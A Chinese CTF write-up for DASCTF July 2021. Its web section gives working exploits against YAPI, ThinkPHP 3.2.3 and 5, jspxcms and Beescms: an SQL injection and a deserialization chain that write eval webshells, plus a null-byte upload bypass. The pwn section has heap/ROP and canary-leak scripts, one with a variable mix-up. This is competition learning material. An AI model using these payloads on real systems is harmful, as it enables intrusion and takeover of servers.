> 原文链接: https://www.anquanke.com//post/id/250113 


# 2021DASCTF实战精英夏令营暨DASCTF July X CBCTF 4th WP


                                阅读量   
                                **21412**
                            
                        |
                        
                                                                                    



[![](https://p1.ssl.qhimg.com/t0113029b4a1e1f12d2.png)](https://p1.ssl.qhimg.com/t0113029b4a1e1f12d2.png)



## web

### <a class="reference-link" name="ezrce"></a>ezrce

打开是YAPI ，nodejs写的。翻到底下看到了版本`1.9.2`，然后就去查了对应的漏洞，有爆出过接口管理平台的RCE，找到了一篇文章`https://blog.csdn.net/Trouble_99/article/details/118667625`跟着复现就完了：

先注册一个账号，然后进去创建一个项目,在设置里面的全局mock里面写上我们的恶意payload:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0101437cf67537d760.png)

然后去添加一个接口:

[![](https://p0.ssl.qhimg.com/t011300f4f81e19b07d.png)](https://p0.ssl.qhimg.com/t011300f4f81e19b07d.png)

最后我们访问这个Mock地址就可以RCE了：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01de0de4b3aa2d460d.png)

同样的我们改一下一开始的mock脚本中的代码，换成 cat /ffffffflllllaggggg ，步骤一样的，最后就能拿到flag了。

### <a class="reference-link" name="cat%20flag"></a>cat flag

```
&lt;?php

if (isset($_GET['cmd'])) `{`
    $cmd = $_GET['cmd'];
    if (!preg_match('/flag/i',$cmd))
    `{`
        $cmd = escapeshellarg($cmd);
        system('cat ' . $cmd);
    `}`
`}` else `{`
    highlight_file(__FILE__);
`}`
?&gt;
```

这题一开始对传入的参数进行了escapeshellarg处理，造成不了拼接和多语句执行。但是可以查文件内容。

一开始去查了一下 /etc/psswd, 可以正常读。然后就没啥思路了，后来给了提示，说管理员访问过，就去查了一下日志文件的内容，发现：

[![](https://p5.ssl.qhimg.com/t01966d176b72282e22.png)](https://p5.ssl.qhimg.com/t01966d176b72282e22.png)

所以直接去cat这个文件就好了，现在的问题就是这个正则匹配flag，怎么绕过去。一开始用数组绕，发现不行。后面去翻了翻escapeshellarg()函数文档：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01669022df98f78773.png)

会忽视非ASCII 字符，所以这个地方就可以绕过正则匹配了。

直接`?cmd=this_is_final_fla%8cg_e2a457126032b42d.php` ，然后F12拿到源代码

## easythinkphp

[![](https://p1.ssl.qhimg.com/t01e8f7b5bc26c0207d.png)](https://p1.ssl.qhimg.com/t01e8f7b5bc26c0207d.png)

看到版本是V3.2.3，就试了一下一些注入之类的洞发现都没打通，然后想起来最近tp3.2.3报了一个结合日志包含的，具体参考了这篇文章：`https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ` 照着复现了一遍：

先写入我们的恶意代码到日志：

`index.php?m=--&gt;&lt;?=system('ls /');?&gt;`

然后包含我们的日志：`index.php?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=.\Application\Runtime\Logs\Home\21_08_01.log`

注意这里的日志时间。然后查出来根目录下存在flag,按照同样的步骤，写恶意代码到日志，然后包含拿flag。

### <a class="reference-link" name="jspxcms"></a>jspxcms

搜到两篇文章

[https://www.freebuf.com/articles/others-articles/229928.html](https://www.freebuf.com/articles/others-articles/229928.html)

[https://lockcy.github.io/2019/10/18/%E5%A4%8D%E7%8E%B0jspxcms%E8%A7%A3%E5%8E%8Bgetshell%E6%BC%8F%E6%B4%9E/](https://lockcy.github.io/2019/10/18/%E5%A4%8D%E7%8E%B0jspxcms%E8%A7%A3%E5%8E%8Bgetshell%E6%BC%8F%E6%B4%9E/)

网页最下面有登录后台的链接，用户名admin，密码为空登进去之后，上传文件

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01e1933f22fbe30e13.png)

先用冰蝎自带的shell.jsp，打包成war文件，然后压缩成zip压缩包

```
jar cf shell.war *
```

上传文件之后选择zip解压

[![](https://p0.ssl.qhimg.com/t018dc617687ebf6747.png)](https://p0.ssl.qhimg.com/t018dc617687ebf6747.png)

用冰蝎连接，getshell

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01cfeeede3b1d5ee81.png)

### <a class="reference-link" name="Cybercms"></a>Cybercms

这个题一打开，给了提示说是信息收集，然后扫了一下，发现有www.zip，下载后在data/config.php里面发现数据库的密码

[![](https://p1.ssl.qhimg.com/t01045e779085807953.png)](https://p1.ssl.qhimg.com/t01045e779085807953.png)

然后找到后台，用这个密码试着登陆一下，发现可以进去。

试了后台几个文件上传的点，发现会报错，还有一个就是上传后，访问会报404，可能会有条件竞争？

于是换了一个思路，这个时候发现其实这是一个Beescms，然后去搜了一下，有一个登陆窗口写shell的洞，不过直接打不行，代码做了修改，这里看一下登陆具体的代码：

```
$user=fl_html(f1_vvv(fl_value($_POST['user'])));
$password=fl_html(f1_vvv(fl_value($_POST['password'])));
```

跟进一下这几个函数：

```
function fl_value($str)`{`
    if(empty($str))`{`return;`}`
    return preg_replace('/select|insert | update | and | in | on | left | joins | delete |\%|\=|\.\.\/|\.\/| union | from | where | group | into |load_file
|outfile/i','',$str);
`}`
define('INC_BEES','B'.'EE'.'SCMS');
function fl_html($str)`{`
    return htmlspecialchars($str);
`}`
function f1_vvv($str)`{`
    if(empty($str))`{`return;`}`
    if(preg_match("/\ /i", $str))`{`
        exit('Go away,bad hacker!!');
    `}`
    preg_replace('/0x/i','',$str);
    return $str;
`}`
```

过滤的很鸡肋，空格可以用`/**/`代替，然后其他的可以双写

最终的payload:

`user=admin'union/**/seselectlect/**/1,1,1,1,0x3c3f706870206576616c28245f504f53545b636d645d293b3f3e/**/into/**/outoutfilefile/**/'/var/www/html/k.php'#&amp;password=1` 然后我们的马就写到web根目录下面了，然后蚁剑连上去读flag就好了

### <a class="reference-link" name="ez_website"></a>ez_website

根据`https://ma4ter.cn/2527.html`文章中的rce，考虑到web根目录不可写，换runtime写：

```
&lt;?php
namespace think\process\pipes `{`
    class Windows `{`
        private $files = [];

        public function __construct($files)
        `{`
            $this-&gt;files = [$files]; //$file =&gt; /think/Model的子类new Pivot(); Model是抽象类
        `}`
    `}`
`}`

namespace think `{`
    abstract class Model`{`
        protected $append = [];
        protected $error = null;
        public $parent;

        function __construct($output, $modelRelation)
        `{`
            $this-&gt;parent = $output;  //$this-&gt;parent=&gt; think\console\Output;
            $this-&gt;append = array("xxx"=&gt;"getError");     //调用getError 返回this-&gt;error
            $this-&gt;error = $modelRelation;               // $this-&gt;error 要为 relation类的子类，并且也是OnetoOne类的子类==&gt;&gt;HasOne
        `}`
    `}`
`}`

namespace think\model`{`
    use think\Model;
    class Pivot extends Model`{`
        function __construct($output, $modelRelation)
        `{`
            parent::__construct($output, $modelRelation);
        `}`
    `}`
`}`

namespace think\model\relation`{`
    class HasOne extends OneToOne `{`

    `}`
`}`
namespace think\model\relation `{`
    abstract class OneToOne
    `{`
        protected $selfRelation;
        protected $bindAttr = [];
        protected $query;
        function __construct($query)
        `{`
            $this-&gt;selfRelation = 0;
            $this-&gt;query = $query;    //$query指向Query
            $this-&gt;bindAttr = ['xxx'];// $value值，作为call函数引用的第二变量
        `}`
    `}`
`}`

namespace think\db `{`
    class Query `{`
        protected $model;

        function __construct($model)
        `{`
            $this-&gt;model = $model; //$this-&gt;model=&gt; think\console\Output;
        `}`
    `}`
`}`
namespace think\console`{`
    class Output`{`
        private $handle;
        protected $styles;
        function __construct($handle)
        `{`
            $this-&gt;styles = ['getAttr'];
            $this-&gt;handle =$handle; //$handle-&gt;think\session\driver\Memcached
        `}`

    `}`
`}`
namespace think\session\driver `{`
    class Memcached
    `{`
        protected $handler;

        function __construct($handle)
        `{`
            $this-&gt;handler = $handle; //$handle-&gt;think\cache\driver\File
        `}`
    `}`
`}`

namespace think\cache\driver `{`
    class File
    `{`
        protected $options=null;
        protected $tag;

        function __construct()`{`
            $this-&gt;options=[
                'expire' =&gt; 3600,
                'cache_subdir' =&gt; false,
                'prefix' =&gt; '',
                'path'  =&gt; 'php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../runtime/a.php',
                'data_compress' =&gt; false,
            ];
            $this-&gt;tag = 'xxx';
        `}`

    `}`
`}`

namespace `{`
    $Memcached = new think\session\driver\Memcached(new \think\cache\driver\File());
    $Output = new think\console\Output($Memcached);
    $model = new think\db\Query($Output);
    $HasOne = new think\model\relation\HasOne($model);
    $window = new think\process\pipes\Windows(new think\model\Pivot($Output,$HasOne));
    echo urlencode(serialize($window));

`}`
```

反序列化：

```
http://b581b27f-0c02-4748-8e55-10e03abc02e5.node4.buuoj.cn/index.php/index/labelmodels/get_label?tag_array[cfg]=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A15%3A%22%00%2A%00selfRelation%22%3Bi%3A0%3Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22xxx%22%3B%7Ds%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A3600%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A130%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DaaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g%2F..%2Fruntime%2Fa.php%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bs%3A3%3A%22xxx%22%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3Br%3A11%3B%7D%7D%7D
```

执行`/readflag`：

```
http://b581b27f-0c02-4748-8e55-10e03abc02e5.node4.buuoj.cn/runtime/a.php12ac95f1498ce51d2d96a249c09c1998.php

ccc=system('/readflag');
```

### <a class="reference-link" name="jj%E2%80%99s%20camera"></a>jj’s camera

经过一系列的查找，发现了源码`https://buliang0.tk/archives/0227.html`

只有qbl.php那里可以利用：

```
if(preg_match('/^(data:\s*image\/(\w+);base64,)/', $base64_img, $result))`{`
  $type = $result[2];
  if(in_array($type,array('bmp','png')))`{`
    $new_file = $up_dir.$id.'_'.date('mdHis_').'.'.$type;
    file_put_contents($new_file, base64_decode(str_replace($result[1], '', $base64_img)));
    header("Location: ".$url);
  `}`
`}`
```

想办法写马，但是后缀似乎不可控。看了一下php版本，是5.2.17，可以00截断。但是注意：

```
$id = trim($_GET['id']);
```

所以%00后面再添上个东西就可以了。

```
https://node4.buuoj.cn:26590/qbl.php?id=.feng.php%00123&amp;url=123

img=data:image/png;base64,PD9waHAgZXZhbCgkX1BPU1RbMF0pOw==
```



## Crypto

### <a class="reference-link" name="Yusa%E7%9A%84%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AD%BE%E5%88%B0%E2%80%94%E2%80%94BlockTrick"></a>Yusa的密码学签到——BlockTrick

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0164b80017f8d78ada.png)



## Misc

### <a class="reference-link" name="ezSteganography"></a>ezSteganography

用stegsolve打开图片，在red plane 0通道发现G plane通道有东西

[![](https://p3.ssl.qhimg.com/t0162d31616d7787a6f.png)](https://p3.ssl.qhimg.com/t0162d31616d7787a6f.png)

保存Green plane 0的图片然后用stegsolve的Image Combiner功能进行对比

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t018f38872953587606.png)

发现了前一半flag还有后一半flag的提示是用QIM量化，步长为20

[![](https://p3.ssl.qhimg.com/t01b408266258345913.png)](https://p3.ssl.qhimg.com/t01b408266258345913.png)

在github搜索QIM quantization搜到这个网址[https://github.com/pl561/QuantizationIndexModulation/blob/master/qim.py](https://github.com/pl561/QuantizationIndexModulation/blob/master/qim.py)

仿照里面的test_qim进行函数重写，发现结果里的msg_detected全是1和0，把所有的0都改成255，再保存成新的图片，得到后一半flag

exp如下：

```
"""Implementation of QIM method from Data Hiding Codes, Moulin and Koetter, 2005"""

from __future__ import print_function
import sys
import os
HOME = os.environ["HOME"]

import numpy as np
import cv2
from tqdm import tqdm
# from libnum import *
# from gmpy2 import *


class QIM:
    def __init__(self, delta):
        self.delta = delta

    def embed(self, x, m):
        """
        x is a vector of values to be quantized individually
        m is a binary vector of bits to be embeded
        returns: a quantized vector y
        """
        x = x.astype(float)
        d = self.delta
        y = np.round(x/d) * d + (-1)**(m+1) * d/4.
        return y

    def detect(self, z):
        """
        z is the received vector, potentially modified
        returns: a detected vector z_detected and a detected message m_detected
        """

        shape = z.shape
        z = z.flatten()

        m_detected = np.zeros_like(z, dtype=float)
        z_detected = np.zeros_like(z, dtype=float)

        z0 = self.embed(z, 0)
        z1 = self.embed(z, 1)

        d0 = np.abs(z - z0)
        d1 = np.abs(z - z1)

        gen = zip(range(len(z_detected)), d0, d1)
        for i, dd0, dd1 in gen:
            if dd0 &lt; dd1:
                m_detected[i] = 0
                z_detected[i] = z0[i]
            else:
                m_detected[i] = 1
                z_detected[i] = z1[i]


        z_detected = z_detected.reshape(shape)
        m_detected = m_detected.reshape(shape)
        return z_detected, m_detected.astype(int)

    def random_msg(self, l):
        """
        returns: a random binary sequence of length l
        """
        return np.random.choice((0, 1), l)


# def test_qim():
#     """
#     tests the embed and detect methods of class QIM
#     """
#     l = 10000 # binary message length
#     delta = 20 # quantization step
#     qim = QIM(delta)

#     while True:
#         x = np.random.randint(0, 255, l).astype(float) # host sample


#         msg = qim.random_msg(l)
#         y = qim.embed(x, msg)
#         z_detected, msg_detected = qim.detect(y)

#         print(x)
#         print(y)
#         print(z_detected)

#         print(msg)
#         print(msg_detected)
#         assert np.allclose(msg, msg_detected) # compare the original and detected messages
#         assert np.allclose(y, z_detected)     # compare the original and detected vectors

def my_test_qim():
    delta = 20
    qim = QIM(delta)
    y = cv2.imread('/Users/lizihan/Downloads/ezSteganography-flag.png')
    z_detected, msg_detected = qim.detect(y)
    for i in tqdm(range(len(msg_detected))):
        for j in range(len(msg_detected[i])):
            for k in range(len(msg_detected[i][j])):
                if msg_detected[i][j][k] == 1:
                    msg_detected[i][j][k] = 255
    cv2.imwrite('flag3.png', msg_detected)

def main():
    my_test_qim()


if __name__ == "__main__":
    sys.exit(main())
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01382c8396aabcb71b.png)

flag`{`2e9ec6480d05150c211963984dcbc9f1`}`

### <a class="reference-link" name="red_vs_blue"></a>red_vs_blue

手动发现规律刚开始就设定好了，所以采用爆破思想即可，已知的规律都存入一个列表中，重开的时候直接输入列表里存放的结果，下一个如果尝试失败就换相反的队伍

exp如下：

```
from pwn import*
import random
context(os='linux',arch='amd64',log_level='debug')

p = remote("node4.buuoj.cn", 26828)

my_list = [] 
for i in range(66):
    my_list.append('0')
count = 0
flag = 1
while True:
    text = p.recvline()
    if text == "Sorry!You are wrong!\n":
        flag += 1
        p.sendline('y')
        count = 0
    if text == "choose one [r] Red Team,[b] Blue Team:\n":
        if my_list[count] == 'r':
            p.sendline('r')
            count += 1
        elif my_list[count] == 'b':
            p.sendline('b')
            count += 1
        else:
            if flag % 2 == 1:
                num = 'r'
                p.sendline('r')
                p.recvline()
                text = p.recvline()
                if text == "The result Red Team\n":
                    my_list[count] = num
                    log.info(''.join(i for i in my_list))
                    count += 1
            if flag % 2 == 0:
                num = 'b' 
                p.sendline('b')
                p.recvline()
                text = p.recvline()
                if text == "The result Blue Team\n":
                    my_list[count] = num
                    log.info(''.join(i for i in my_list))
                    count += 1
```

[![](https://p2.ssl.qhimg.com/t01ded4124fa41b3cea.png)](https://p2.ssl.qhimg.com/t01ded4124fa41b3cea.png)

### <a class="reference-link" name="funny_maze"></a>funny_maze

在CSDN搜到一个python自动走迷宫的脚本[https://blog.csdn.net/qq_29681777/article/details/83719680，稍微把它的修改修改即可](https://blog.csdn.net/qq_29681777/article/details/83719680%EF%BC%8C%E7%A8%8D%E5%BE%AE%E6%8A%8A%E5%AE%83%E7%9A%84%E4%BF%AE%E6%94%B9%E4%BF%AE%E6%94%B9%E5%8D%B3%E5%8F%AF)

exp如下：

```
# coding=utf-8
from pwn import *


context(os='linux',arch='amd64',log_level='debug')
p = remote("node4.buuoj.cn",27665)


dirs=[(0,1),(1,0),(0,-1),(-1,0)] #当前位置四个方向的偏移量
path = []              #存找到的路径

def mark(maze,pos):  #给迷宫maze的位置pos标"2"表示“倒过了”
    maze[pos[0]][pos[1]]=2


def passable(maze,pos): #检查迷宫maze的位置pos是否可通行
    return maze[pos[0]][pos[1]]==0


def find_path(maze, pos, end):
    mark(maze,pos)
    if pos==end:
        path.append(pos)
        return True
    for i in range(4):      #否则按四个方向顺序检查
        nextp=pos[0]+dirs[i][0],pos[1]+dirs[i][1]
        #考虑下一个可能方向
        if passable(maze,nextp):        #不可行的相邻位置不管
            if find_path(maze,nextp,end):#如果从nextp可达出口，输出这个位置，成功结束
                path.append(pos)
                return True
    return False


def pwn():
    if count &gt; 0:
        p.recvline()
        p.recvline()
        p.recvline()
    text = p.recvline()
    length = len(text) - 1  # '\n'占了一位
    maze = []
    maze.append([1] * length)
    for i in range(length - 1):  # 前面已经接收了第一行了
        text = p.recvline()
        maze1 = []
        for j in range(len(text) - 1):
            if text[j] == '#':
                maze1.append(1)
            elif text[j] == ' ':
                maze1.append(0)
            elif text[j] == 'S':
                maze1.append(1)
                start = (i + 1, j + 1)
            elif text[j] == 'E':
                maze1.append(1)
                end = (i + 1, j - 1)
        maze.append(maze1)
    find_path(maze,start,end)
    p.sendlineafter('Please enter your answer:\n', str(len(path) + 2))


if __name__ == '__main__':
    p.sendlineafter('3.Introduction to this game\n', '1')
    count = 0
    while True:
        pwn()
        path = []
        count += 1
```

[![](https://p3.ssl.qhimg.com/t01a22b13a032e0f7c5.png)](https://p3.ssl.qhimg.com/t01a22b13a032e0f7c5.png)



## PWN

### <a class="reference-link" name="Easyheap"></a>Easyheap

程序使用strdup函数来malloc，它会根据你实际输入的内容大小来进行malloc，但是程序在add时同样需要输入size，并且将size写到了一个size数组中。之后在edit中发现，edit写入时，程序查看的是size数组中的大小。

所以我们add时输入大size，但写入少许内容，之后再edit这个chunk，就可以进行随意溢出。

首先利用extend去free一个unsortedbin，之后申请chunk，进行切片，使libc落到被覆盖的chunk里，打印libc_base。此时这个chunk同时处于allocate和free态，将它申请回来，可以double free泄露heap_base。

之后劫持malloc_hook，动调后，写入gadget add rsp 0x38 ；ret，栈上rop进行orw获取flag

```
from pwn import *
context(os='linux',arch='amd64',log_level='debug')

#p = process('./Easyheap')
#libc = ELF('/home/hacker/glibc-all-in-one/libs/2.30-0ubuntu2_amd64/libc-2.30.so')
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")

p = remote("node4.buuoj.cn",28436)
#libc = ELF('/home/hacker/Desktop/libc/amd64/libc-2.30.so')

elf = ELF('./Easyheap')


def add(size,content):
    p.sendlineafter("&gt;&gt; :\n",'1')
    p.sendlineafter("Size: \n",str(int(size)))
    p.sendlineafter("Content: \n",content)

def edit(idx,content):
    p.sendlineafter("&gt;&gt; :\n",'4')
    p.sendlineafter("Index:\n",str(idx))
    p.sendafter("Content:\n",content)

def show(idx):
    p.sendlineafter("&gt;&gt; :\n",'3')
    p.sendlineafter("Index:\n",str(idx))

def free(idx):
    p.sendlineafter("&gt;&gt; :\n",'2')
    p.sendlineafter("Index:\n",str(idx))

add(0x30,"/flag".ljust(0x10,'a'))#0
add(0x500,'a'*0x4d0)
add(0x10,'a'*0x10)
add(0x20,'a'*0x20)#3
edit(0,'b'*0x10+p64(0)+p64(0x501))
free(1)
add(0x4d0,'c'*0x4d0)#1
show(2)
p.recvuntil("Content: ")
libc_base = u64(p.recv(6).ljust(8,'\x00'))-96-0x10-libc.sym["__malloc_hook"]
log.info("libc_base="+hex(libc_base))

add(0x10,'a'*0x10)#4 = 2 double free
add(0x10,'a'*0x10)
add(0x30,"/flag\x00".ljust(0x30,'a'))#6
free(5)
free(2)
show(4)
p.recvuntil("Content: ")
heap_base = u64(p.recv(6).ljust(8,'\x00'))-0x7b0
log.info("heap_base="+hex(heap_base))
flag_addr = heap_base+0x7d0
log.info("flag_addr="+hex(flag_addr))

add(0x10,'a'*0x10)#2
add(0x10,'a'*0x10)#5

add(0x50,'a'*0x20)#7
add(0x10,'a'*0x10)#8
free(8)
edit(7,'a'*0x20+p64(0)+p64(0x21)+p64(libc_base+libc.sym["__malloc_hook"]))


add(0x10,'a'*0x10)#9


pop_rdi = libc_base+0x215bf
pop_rsi = libc_base+0x23eea
pop_rdx = libc_base+0x1b96
pop_rax = libc_base+0x43ae8
syscall = libc_base+0x13c0

gadget = libc_base+0xe0c4d #0x38

#open(flag_addr,0)
rop_chains = p64(pop_rdi)+p64(flag_addr)
rop_chains+= p64(pop_rsi)+p64(0)
rop_chains+= p64(pop_rax)+p64(2)
rop_chains+= p64(libc_base+libc.sym["open"])
#read(3,flag_addr,0x30)
rop_chains+= p64(pop_rdi)+p64(3)
rop_chains+= p64(pop_rsi)+p64(flag_addr)
rop_chains+= p64(pop_rdx)+p64(0x30)
rop_chains+= p64(pop_rax)+p64(0)
rop_chains+= p64(libc_base+libc.sym["read"])
#write(1,flag_addr,0x30)
rop_chains+= p64(pop_rdi)+p64(1)
rop_chains+= p64(pop_rsi)+p64(flag_addr)
rop_chains+= p64(pop_rdx)+p64(0x30)
rop_chains+= p64(pop_rax)+p64(1)
rop_chains+= p64(libc_base+libc.sym["write"])

add(0x10,p64(gadget))#7   malloc hook

#add(0x100,"a"*0x100)
add(0x400,rop_chains)


p.interactive()
```

### <a class="reference-link" name="old_thing"></a>old_thing

程序需要输入密码，加密后和一字符串s2比较，相同便可进入，而且给了后门，所以只需要login进去，就可以轻松getshell。在输入密码read的地方发现off by null，而且输入的s和比对的字符串s2在栈里物理相邻，所以输入0x20长度的密码，就可以截断s2，并且如果输入的s加密后最低位也为00的话，则可以绕过strcmp，成功login。

直接随机生成字符串进行爆破，下面是爆破脚本

```
from pwn import * 
from LibcSearcher import *
import hashlib
context(os='linux',arch='amd64',log_level='debug')

#ms = remote("node3.buuoj.cn",25543)

elf = ELF("./canary3")

def generate_char_id():
    m2 = hashlib.md5()
    m2.update(str(time.time()).encode('utf-8'))
    return m2.hexdigest()
while True:
    ms = process("./canary3")
    ms.sendafter("please input username: ","admin")
    payload = generate_char_id()
    ms.sendafter("please input password: ",payload)
    if(ms.recvline()=="Login Fail\n"):
        continue
    else:
        break
```

得到密码：aeedc57231ad54641b5ecb7faa0479c8

之后进入程序，getshell

```
from pwn import * 
from LibcSearcher import *
context(os='linux',arch='amd64',log_level='debug')

p = remote("node4.buuoj.cn",26096)

elf = ELF("./canary3")


#p = process("./canary3")
p.sendafter("please input username: ","admin")
payload = "aeedc57231ad54641b5ecb7faa0479c8"
p.sendafter("please input password: ",payload)

p.sendlineafter("3.exit\n",'2')
p.sendafter("your input:\n",'a'*(0x20-0x8)+'x')
p.sendlineafter("3.exit\n",'1')
p.recvuntil('x')
canary = u64(ms.recv(7)[0:7].rjust(8,'\x00'))
log.info("canary="+hex(canary))
base = u64(ms.recv(6).ljust(8,'\x00'))-0x2530
log.info("base="+hex(base))
addr = base+0x239f

p.sendlineafter("3.exit\n",'2')
payload = 'a'*(0x20-0x8)+p64(canary)+p64(0)+p64(addr)
p.sendafter("your input:\n",payload)
p.sendlineafter("3.exit\n",'3')
p.interactive()
```
